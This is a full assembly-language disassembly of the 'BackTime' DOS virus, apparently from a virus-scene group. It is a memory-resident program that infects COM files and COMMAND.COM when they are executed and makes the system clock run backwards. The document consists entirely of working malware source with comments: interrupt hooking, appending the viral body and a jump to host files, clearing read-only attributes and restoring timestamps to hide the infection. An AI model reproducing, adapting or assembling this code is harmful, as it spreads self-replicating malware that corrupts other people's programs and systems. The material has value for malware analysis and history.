;***************************************************************************
;*                            THE BACKTIME VIRUS
;*
;* Disassembled by Soltan Griss [RABID]
;*
;* Note:
;*
;*      The backtime virus is a memory resident Com infector
;*      that will infect COMMAND.COM as well
;*      The only real unique trait is that it runs the system clock backwards
;***************************************************************************

PAGE  59,132

.286c

seg_a           segment byte public                    ;The usual
                assume  cs:seg_a, ds:seg_a             ;
                org     100h                           ;Start at 100h (COM)
                                                       ;
BACKTIME        proc    far                            ;
                                                       ;
;------------------------------------------------------;
start:                                                 ;
                jmp     load                           ;jump to load routine
                db      03h,0AAh                       ;Infected files ID tag
                                                       ;
                db      21h,0cdh,20h                   ;\
                                                       ; Original file with 
                                                       ; first 5 bytes last
buffer:         db      0b4h,02,0b2h,53h,0cdh          ;/      
                db      'BackTime'                     ;Virus Name
;------------------------------------------------------;
new_jmp:        db      0E9h                           ;Jmp buffer to write
jmp_buff        db      6ah,01h                        ;to begining of file
                db      03h,0AAh                       ;Writes 5 bytes
;------------------------------------------------------;
old_8           dw      0,0                            ;Store old int 8  here
old_21          dw      0,0                            ;Store old int 21 here
old_24          dw      0,0                            ;Store old int 24 here
attrib          dw      0                              ;Store file attributes
date            dw      0                              ;Store old date
time            dw      0                              ;Store old time
;------------------------------------------------------;**NEW INT 8 ROUTINE**
new_8:          push    ax                             ;Save registers
                push    bx                             ;
                push    cx                             ;
                push    ds                             ;
                xor     ax,ax                          ;
                mov     ds,ax                          ;get current time at
                mov     bx,ds:46Ch                     ;0000:046C-046E
                mov     cx,ds:046Eh                    ;
                dec     bx                             ;decrement the seonds
                jno     loc_4                          ;
                dec     cx                             ;decrement the Minute 
                jno     loc_4                          ;
                mov     bx,0AFh                        ;if overflow reset to 
                mov     cx,18h                         ;24 hours
loc_4:                                                 ;
                dec     bx                             ;
                jno     loc_5                          ;if its ok decrement
                dec     cx                             ;again  to go back one 
                jno     loc_5                          ;more,cause time in 
                mov     bx,0AFh                        ;incremant it negating
                mov     cx,18h                         ;first decrement
loc_5:                                                 ;
                mov     ds:046Eh,cx                    ;store it back to 
                mov     ds:046Ch,bx                    ;0000:046C
                pop     ds                             ;
                pop     cx                             ;
                pop     bx                             ;restore registers
                pop     ax                             ;
do_old_8:       jmp     dword ptr cs:[old_8-buffer]    ;
                                                       ;do old int 8
;------------------------------------------------------;**NEW INT 21 ROUTINE**
new_21:         cmp     ax,4b00h                       ;check for load/execute
                jz      infect                         ;
                cmp     ax,0AA03h                      ;check for residency 
                jnz     do_old_21                      ;check
                Xchg    ah,al                          ;swap AL/AH and return
                iret                                   ;
do_old_21:      jmp     dword ptr cs:[old_21-buffer]   ;do old int 21
                                                       ;
infect:         push    ax                             ;
                push    bx                             ;
                push    cx                             ;
                push    dx                             ;
                push    ds                             ;save registers
                push    es                             ;
                push    dx                             ;
                push    ds                             ;
                mov     ax,cs                          ;
                mov     ds,ax                          ;get old int 24 routine
                mov     ax,3524h                       ;
                int     21h                            ;
                                                       ;
                mov     ds:[(old_24-buffer)],bx        ;save it.
                mov     ds:[(old_24+2h-buffer)],es     ;
                mov     dx,(offset new_24- offset buffer);   
                mov     ax,2524h                       ;point to our new int
                int     21h                            ;24 routine
                pop     ds                             ;
                pop     dx                             ;
                mov     ax,4300h                       ;get the files
                int     21h                            ;attributes
                                                       ;
                jnb     cont                           ;
                jmp     exit_com                       ;exit if error
                                                       ;
cont:                                                  ;
                mov     cs:(attrib-buffer),cx          ;save the files attribs
                and     cx,0FFF8h                      ;check for read only
                mov     ax,4301h                       ;gets rid of read only
                int     21h                            ;attributes
                                                       ;
                jnc     not_infected                   ;keep going if ok
                                                       ;
                jmp     exit_com                       ;
not_infected:                                          ;
                push    dx                             ;
                push    ds                             ;
                mov     ax,3D02h                       ;open the file to 
                int     21h                            ;infect
                                                       ;
                jnc     keep_going                     ;
                jmp     rst_exit                       ;exit if error
keep_going:                                            ;
                mov     bx,ax                          ;save file handle in bx
                mov     ax,cs                          ;cs into ds
                mov     ds,ax                          ;
                mov     ax,5700h                       ;get the files time 
                int     21h                            ;and date
                                                       ;
                jc      bad_td                         ;
                mov     ds:[date-buffer],dx            ;save time and date 
                mov     ds:[time-buffer],cx            ;
                                                       ;
                mov     dx,00h                         ;buffer at cs:0000
                mov     cx,5                           ;
                mov     ah,3Fh                         ;read in first 5 bytes 
                int     21h                            ;into buffer
                                                       ;
                                                       ;
                jc      error                          ;
                cmp     ax,cx                          ;
                jb      error                          ;
                cmp     word ptr ds:0000h,5A4Dh        ;check for EXE
                je      error                          ;
                cmp     word ptr ds:03h,0AA03h         ;check for ID tagin
                je      error                          ;file
                xor     cx,cx                          ;
                xor     dx,dx                          ;
                mov     ax,4202h                       ;go to the end of the 
                int     21h                            ;file to calculate size
                                                       ;
                jc      error                          ;
                or      dx,dx                          ;check for 0 bytefile
                jnz     error                          ;
                                                       ;
                cmp     ax,0EA60h                      ;check to see that file
                jae     error                          ;is under 64096 bytes
                                                       ;
                add     ax,(vend-buffer-0Aeh)          ;calculate the jmp to 
                mov     ds:[jmp_buff-buffer],ax        ;to load
                                                       ;
                xor     dx,dx                          ;
                mov     cx,(vend-buffer)               ;copy virus to end of
                mov     ah,40h                         ;file
                int     21h                            ;
                                                       ;
                jc      error                          ;jump if error
                cmp     ax,cx                          ;check to see if all
                jb      error                          ;bytes written.
                xor     cx,cx                          ;
                                                       ;
                xor     dx,dx                          ;
                mov     ax,4200h                       ;go to begining of file
                int     21h                            ;
                jc      error                          ;
                mov     dx,(offset new_jmp-108h)       ;write jmp in front of
                mov     cx,5                           ;file from jmp buffer
                mov     ah,40h                         ;
                int     21h                            ;
                                                       ;
error:                                                 ;
                mov     cx,ds:[time-buffer]            ;
                mov     dx,ds:[date-buffer]            ;restore time and date
                mov     ax,5701h                       ;
                int     21h                            ;
                                                       ;
bad_td:                                                ;
                mov     ah,3Eh                         ;
                int     21h                            ;close the file
                                                       ;
rst_exit:                                              ;
                mov     cx,ds:[attrib-buffer]          ;
                pop     ds                             ;restore attributes to
                pop     dx                             ;the file from files
                mov     ax,4301h                       ;ds:dx
                int     21h                            ;
                                                       ;
exit_com:                                              ;
                mov     ax,cs:[old_24]                 ;restore old Int 24
                mov     ds,ax                          ;
                mov     dx,cs:[old_24+2]               ;
                mov     ax,2524h                       ;
                int     21h                            ;
                                                       ;
                pop     es                             ;
                pop     ds                             ;
                pop     dx                             ; restore registers
                pop     cx                             ;
                pop     bx                             ;
                pop     ax                             ;
                jmp     do_old_21                      ;do the old int 21
;------------------------------------------------------;**NEW INT 24 ROUTINE**
new_24:         mov     al,03h                         ;
                iret                                   ;
;------------------------------------------------------;**LOAD ROUTINE**
load:                                                  ;
                push    ax                             ;
                call    NEXT                           ;
NEXT:           pop     bx                             ;get offset
                mov     di,100h                        ;
                lea     si,[bx-169h]                   ;point si to buffer
                mov     cx,5                           ;
                cld                                    ;COPY ORIGINAL 5 BYTES 
                rep     movsb                          ;BACK TO 100h
                                                       ;
                push    bx                             ;
                mov     ah,30h                         ;CHECK FOR DOS VERSION
                int     21h                            ;
                cmp     al,3                           ;
                pop     bx                             ;
                jc      Finish                         ;
                                                       ;
                mov     ax,0AA03h                      ;
                int     21h                            ;Residency Check 
                cmp     ax,03AAh                       ;
                je      Finish                         ;We are already here!
                                                       ;
                mov     ax,cs                          ;
                dec     ax                             ;
                mov     es,ax                          ;
                push    bx                             ;
                mov     bx,es:0003h                    ;
                cmp     bx,2000h                       ;check for only 8k 
                jb      Finish                         ;memory left
                                                       ;
                sub     bx,(vend-buffer)/16+1          ;subtract size from 
                                                       ;alailable memory
                mov     ax,cs                          ;
                mov     es,ax                          ;Allocate memory for
                mov     ah,4Ah                         ;our code
                int     21h                            ;
                                                       ;
                pop     bx                             ;
                jc      Finish                         ;
                push    bx                             ;
                mov     bx,21h                         ;
                nop                                    ;
                mov     ah,48h                         ;get pointer to 
                int     21h                            ;memory block
                                                       ;
                pop     bx                             ;AX-pointer to block
                jc      Finish                         ;
                dec     ax                             ;go to PSP
                mov     word ptr ds:[2],ax             ;
                mov     es,ax                          ;Set owner to DOS ect.
                inc     ax                             ;
                mov     es:0001h,ax                    ;Put file size here
                mov     es,ax                          ;
                                                       ;
                xor     di,di                          ;Copy virus to new
                lea     si,[bx-169h]                   ;mem. block starting at
                mov     cx,(vend-buffer)/2             ;buffer virus size /2
                cld                                    ;
                rep     movsw                          ;
                mov     ds,ax                          ;copy it to block
                                                       ;
                mov     ax,3508h                       ;
                int     21h                            ;get current int 8
                mov     ds:(old_8-offset buffer),bx    ;save it
                mov     ds:(old_8+2-offset buffer),es  ;
                                                       ;
                mov     ax,3521h                       ;
                int     21h                            ;get current int 21
                mov     ds:(old_21-offset buffer),bx   ;save it
                mov     ds:(old_21+2-offset buffer),es ;     
                                                       ;
                mov     dx,offset new_8-offset buffer  ;point to our int 8
                mov     ax,2508h                       ;
                int     21h                            ;
                                                       ;
                mov     dx,offset new_21-offset buffer ;point to out int 21
                mov     ax,2521h                       ;
                int     21h                            ;
                                                       ;
Finish:                                                ;
                mov     ax,cs                          ;
                mov     ds,ax                          ;jmp back to 100h
                mov     es,ax                          ;
                pop     ax                             ;
                mov     bx,offset 100h                 ;
                push    bx                             ;
                retn                                   ;

this_one:       out     dx,ax                          ;
                or      cx,ds:[si+071eh]               ;hmm??? it works!
                or      ax,1E8Ch                       ;
                                                       ;
backtime        endp                                   ;
vend            equ     $                              ;
                ends                                   ;
                end     start
